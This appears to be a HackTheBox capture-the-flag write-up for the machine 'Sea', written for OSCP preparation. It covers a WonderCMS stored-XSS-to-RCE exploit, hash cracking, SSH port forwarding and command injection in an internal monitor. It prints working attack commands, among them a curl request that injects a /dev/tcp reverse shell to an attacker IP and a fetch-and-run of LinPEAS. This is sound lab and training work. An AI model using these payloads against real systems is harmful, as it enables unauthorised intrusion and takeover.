+++
date = '2026-04-16T15:30:00-03:00'
draft = false
title = 'HTB: Sea - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'xss', 'rce', 'wondercms']
description = 'Write-up for the HackTheBox machine Sea - part of my OSCP preparation journey following the Lain Kusanagi list.'
ShowToc = true
TocOpen = false

[cover]
image = 'images/htb-sea/cover.png'
+++

## Why this post exists

This is the first in a series of write-ups I'm publishing as part of my **OSCP** preparation. The strategy is to follow the **Lain Kusanagi curated list** (a fork/evolution of the classic TJNull list), which selects HackTheBox machines with attack vectors and exploitation patterns similar to those found in the exam.

The goal of these posts is not just to document the solution, but to consolidate what I've learned: each write-up is structured as a **condensed pentest report** - recon, enumeration, foothold, privesc and takeaways - in the same format OffSec expects in the exam.

## Machine info

| | |
|---|---|
| **Name** | Sea |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- WonderCMS with "bike" theme vulnerable to **Stored XSS to RCE** (CVE-2023-41425)
- XSS via contact form injects a malicious module that installs a reverse shell
- Cracked credentials from `database.js` give SSH access as `amay`
- Port forward on 8080 reveals System Monitor with **command injection** on the `log_file` parameter to get root

---

## Recon

### RustScan + Nmap

```bash
rustscan -a 10.129.20.94 -- -sV -sC -Pn -A
```

![RustScan initial scan](/joaobonin/images/htb-sea/rustscan.png)

Open ports: **22** (SSH) and **80** (HTTP).

![Nmap results](/joaobonin/images/htb-sea/nmap-results.png)

- **Port 22**: OpenSSH 8.2p1 Ubuntu
- **Port 80**: Apache 2.4.41 (Ubuntu)

### Web service fingerprint

```bash
whatweb http://10.129.20.94/
```

![WhatWeb output](/joaobonin/images/htb-sea/whatweb.png)

Tech stack: **Apache 2.4.41**, **PHP** (PHPSESSID), **Bootstrap 3.3.7**, **jQuery 1.12.4**. Title: "Sea - Home".

---

## Enumeration

### Web - Browsing the site

The main page shows a cycling competition website with the **velik71** theme.

![Port 80 - Homepage](/joaobonin/images/htb-sea/port80.png)

Browsing the site we find a "How can I participate?" page with a link to a **contact form**.

![Participate page](/joaobonin/images/htb-sea/participate-page.png)

The contact form at `contact.php` has fields for Name, Email, Age, Country and **Website**.

![Contact form](/joaobonin/images/htb-sea/contact-form.png)

### Identifying the CMS

Looking at the page source code, I noticed images were being loaded from `/themes/bike/`, indicating the use of a theme called "bike".

![Source code showing /themes/bike/ path](/joaobonin/images/htb-sea/source-code-theme.png)

A quick Google search for "velik71" reveals this is a **WonderCMS** theme called "bike", available at `https://github.com/robiso/bike`.

![WonderCMS bike theme](/joaobonin/images/htb-sea/wondercms-bike-theme.png)

With the theme directory identified, I ran a directory brute force with feroxbuster to enumerate files:

```bash
feroxbuster --url http://sea.htb/themes/bike -w /usr/share/wordlists/dirb/common.txt -x php
```

![Feroxbuster results](/joaobonin/images/htb-sea/feroxbuster.png)

Among the results, the `/themes/bike/version` endpoint returned version **3.2.0**.

**WonderCMS 3.2.0** - vulnerable to **CVE-2023-41425** (Stored XSS to RCE via installModule).

---

## Foothold

### CVE-2023-41425 - WonderCMS XSS to RCE

I used the exploit from [prodigiousMind/CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425) which works as follows:

1. Generates an XSS payload that, when executed by the admin, installs a malicious module (reverse shell)
2. The payload is sent via the contact form in the Website field
3. When the admin views the message, the XSS fires and installs the module

```bash
python exploit.py http://sea.htb/loginURL 10.10.14.208 4444
```

![Exploit output](/joaobonin/images/htb-sea/exploit-output.png)

The exploit generates `xss.js`, starts an HTTP server on port 8000, and instructs you to send the malicious link to the admin. Since the target has no internet access, we need to host `main.zip` (revshell module) locally:

```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
# place main.zip in the same directory as the exploit (served on port 8000)
```

### Debugging the exploit

I submitted the payload in the Website field of the contact form and opened netcat:

![Submitting XSS](/joaobonin/images/htb-sea/xss-submit.png)

The `xss.js` was requested by the target - the XSS executed:

![XSS callback received](/joaobonin/images/htb-sea/xss-callback.png)

But no reverse shell. Time to debug `xss.js`.

![xss.js original code](/joaobonin/images/htb-sea/xss-js-original.png)

The problem was in the `urlWithoutLogBase` variable. Using the browser console to simulate:

![Debug urlWithoutLogBase](/joaobonin/images/htb-sea/debug-urlbase.png)

`urlWithoutLogBase` resolved to `/`, making `urlRev` become `//?installModule=...` - an invalid URL:

![Debug urlRev broken](/joaobonin/images/htb-sea/debug-urlrev.png)

### Fix 1: Hardcode urlWithoutLogBase

I edited the exploit to hardcode `urlWithoutLogBase = 'http://sea.htb/'`:

![Fixed urlWithoutLogBase](/joaobonin/images/htb-sea/exploit-fix-urlbase.png)

I resubmitted the form. This time the target made requests to `main.zip`, but I got an error - the exploit was using `https://` for the installModule URL, but the python server was serving via `http://`:

![Error after fix](/joaobonin/images/htb-sea/exploit-error.png)

### Fix 2: HTTPS to HTTP

I changed `https://` to `http://` in the installModule URL inside the exploit. Resubmitted once more:

![Final successful exploit](/joaobonin/images/htb-sea/exploit-final-success.png)

The target fetched `xss.js`, then `main.zip`, installed the module, and we got a **reverse shell!**

### Shell as www-data

![Shell as www-data](/joaobonin/images/htb-sea/shell-www-data.png)

Upgrade to interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![TTY upgrade](/joaobonin/images/htb-sea/tty-upgrade.png)

---

## Privilege Escalation

### Credentials in database.js

Browsing `/var/www/sea/data/`, I found the WonderCMS `database.js` file containing a bcrypt hash:

![database.js with hash](/joaobonin/images/htb-sea/database-js.png)

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

### Cracking with John

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John cracked](/joaobonin/images/htb-sea/john-crack.png)

Cracked password: **mychemicalromance**

Checking `/etc/passwd`, there are two users: **amay** and **geo**.

### Local enumeration with LinPEAS

```bash
# Kali: serve linpeas
python -m http.server 8000 -d /usr/share/peass/linpeas/

# Target: download and run
wget 10.10.14.208:8000/linpeas.sh -O l.sh
chmod +x l.sh && ./l.sh
```

![LinPEAS download](/joaobonin/images/htb-sea/linpeas-download.png)

LinPEAS revealed interesting internal ports:

![Active ports](/joaobonin/images/htb-sea/active-ports.png)

- **127.0.0.1:8080** - internal web service
- **127.0.0.1:36189** - another service

### Port Forwarding via SSH

With the cracked password, I set up SSH port forwarding as `amay`:

```bash
ssh -N -L 9999:localhost:8080 amay@10.129.20.94
# password: mychemicalromance
```

![SSH port forward](/joaobonin/images/htb-sea/ssh-portforward.png)

### System Monitor - Command Injection

Accessing `http://localhost:9999` on Kali, logged in with `amay:mychemicalromance`:

![Login 8080](/joaobonin/images/htb-sea/login-8080.png)

The application is a **System Monitor (Developing)** with management features:

![System Monitor](/joaobonin/images/htb-sea/system-monitor.png)

The "Analyze" button sends a POST request with the `log_file` parameter. Intercepting with browser DevTools:

![Analyze log request](/joaobonin/images/htb-sea/analyze-log.png)

The `log_file` parameter points to `/var/log/apache2/access.log`. I tested command injection with `ping`:

```bash
curl 'http://localhost:9999/' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: http://localhost:9999/' \
  -H 'Origin: http://localhost:9999' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
  -H 'Priority: u=0, i' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  --data-raw 'log_file=%2Fvar%2Flog%2Fauth.log;ping+-c2+10.10.14.208&analyze_log='
```

Confirmed via tcpdump - ICMP echo request received:

![tcpdump confirm](/joaobonin/images/htb-sea/tcpdump-confirm.png)

### Root shell

Injected a reverse shell via the same parameter:

```bash
curl 'http://localhost:9999/' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: http://localhost:9999/' \
  -H 'Origin: http://localhost:9999' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
  -H 'Priority: u=0, i' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  --data-raw 'log_file=%2Fvar%2Flog%2Fauth.log;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.208/443+0>%261"&analyze_log='
```

![Root shell](/joaobonin/images/htb-sea/root-shell.png)

**Root!**

---

## Takeaways (for OSCP)

- **Always debug public exploits before giving up.** The CVE-2023-41425 exploit had 3 bugs in this machine's context (urlWithoutLogBase, hardcoded HTTPS, wrong path). Understanding the JavaScript code instead of treating the exploit as a black box was essential.
- **Internal ports are gold.** LinPEAS + `netstat` revealed the System Monitor on 8080. On the OSCP, always check services on `127.0.0.1` and set up port forwarding.
- **Password reuse is standard in labs.** The cracked WonderCMS password worked for both SSH (amay) and the System Monitor. Always test for reuse.
- **Command injection in internal web apps** is a common privesc vector. Applications "in development" listening on localhost tend to have little to no input sanitization.

## References

- [HackTheBox - Sea](https://app.hackthebox.com/machines/Sea)
- [CVE-2023-41425 - WonderCMS XSS to RCE](https://github.com/prodigiousMind/CVE-2023-41425)
- [WonderCMS bike theme](https://github.com/robiso/bike)
- Lain Kusanagi list (OSCP prep)
